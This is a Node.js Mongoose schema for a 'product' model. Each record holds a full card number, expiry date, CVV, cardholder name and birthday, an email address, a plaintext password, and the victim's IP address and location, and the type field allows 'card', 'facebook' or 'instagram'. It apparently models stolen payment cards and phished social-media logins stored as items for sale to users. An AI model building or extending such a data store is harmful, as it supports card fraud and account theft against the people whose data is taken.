const mongoose = require("mongoose")
const { user } = require("./user")
const Schema = mongoose.Schema;
const productSchema = new Schema({
    type: {
        type: String,
        enum: ['card', "facebook", "instagram"]
    },
    user_id: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'user'
    },
    country: String,
    country_code: String,
    ip: String,
    city: String,
    zip_code: String,
    card_number: String,
    card_date: String,
    card_csv: String,
    card_user_birthday: String,
    user_email: String,
    user_pass: String,
    card_user_name: String,
    card_user_last_name: String,
    date_create: {
        type: Date,
        default: Date.now
    }
})

module.exports = mongoose.model('product', productSchema)